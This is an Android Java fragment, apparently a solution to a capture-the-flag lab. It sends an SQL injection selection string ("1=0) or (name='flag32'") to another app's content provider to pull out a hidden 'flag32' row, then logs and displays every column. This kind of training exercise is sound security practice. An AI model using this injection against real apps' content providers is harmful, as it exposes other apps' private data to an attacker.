package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag32Fragment extends Fragment {
    private static final String TAG = "Flag32Fragment";

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag32, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag32);
        
        launchButton.setOnClickListener(v -> {
            dumpFlag32Provider();
        });

        return view;
    }
    private void dumpFlag32Provider() {
        // make the matcher return 1
        Uri uri = Uri.parse("content://io.hextree.flag32/flags");
        String selection = "1=0) or (name='flag32'";
        Cursor cursor = requireContext().getContentResolver().query(uri, null, selection,
                null, null);

        if (cursor != null) {
            if (cursor.moveToFirst()) {
                do {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        if (sb.length() > 0) sb.append(", ");
                        sb.append(cursor.getColumnName(i)).append(" = ").append(cursor.getString(i));
                    }
                    Log.d(TAG, sb.toString());
                    Toast.makeText(getContext(), sb.toString(), Toast.LENGTH_LONG).show();
                } while (cursor.moveToNext());
            } else {
                Log.d(TAG, "Cursor is empty.");
                Toast.makeText(getContext(), "No data found", Toast.LENGTH_SHORT).show();
            }
            cursor.close();
        } else {
            Log.d(TAG, "Query failed or returned null cursor.");
            Toast.makeText(getContext(), "Query failed", Toast.LENGTH_SHORT).show();
        }
    }
} 